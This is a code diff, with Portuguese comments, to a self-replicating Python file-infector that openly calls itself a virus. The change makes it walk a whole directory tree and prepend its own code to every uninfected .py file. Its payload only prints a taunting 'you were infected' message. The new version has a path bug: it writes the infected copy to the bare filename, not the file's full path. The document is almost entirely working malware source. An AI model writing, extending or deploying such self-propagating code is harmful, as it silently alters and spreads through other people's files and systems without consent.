@@ -2,6 +2,7 @@
 
 import glob
 import sys
+import os
 
 code = []
 with open(sys.argv[0], 'r') as f:
@@ -16,25 +17,26 @@ for line in lines:
     if line == '### END OF VIRUS ###\n':
         break
 
-python_scripts = glob.glob('*.py') + glob.glob('*.pyw')
+dir_path = os.path.dirname(os.path.realpath(__file__)) # Pega diretorio atual
+for root, dirs, files in os.walk(dir_path):
+    for file in files:
+        if file.endswith('.py'): # filtra arquivos .py
+            with open(root+'/'+str(file), 'r') as f: # abre cada arquivo com seu caminho inteiro,caso contrário dá erro
+                script_code = f.readlines()
 
-for script in python_scripts:
-    with open(script, 'r') as f:
-        script_code = f.readlines()
+            infected = False 
+            for line in script_code:
+                if line == '### START OF VIRUS ###\n':
+                    infected = True
+                    break
+            if not infected:
+                final_code = []
+                final_code.extend(code)
+                final_code.extend('\n')
+                final_code.extend(script_code)
 
-    infected = False
-    for line in script_code:
-        if line == '### START OF VIRUS ###\n':
-            infected = True
-            break
-    if not infected:
-        final_code = []
-        final_code.extend(code)
-        final_code.extend('\n')
-        final_code.extend(script_code)
-
-        with open(script, 'w') as f:
-            f.writelines(final_code)
+                with open(file, 'w') as f:
+                    f.writelines(final_code)
 # Malicious Piece of Code (Payload)
 print('kkkkk,Vc foi infectado')
 
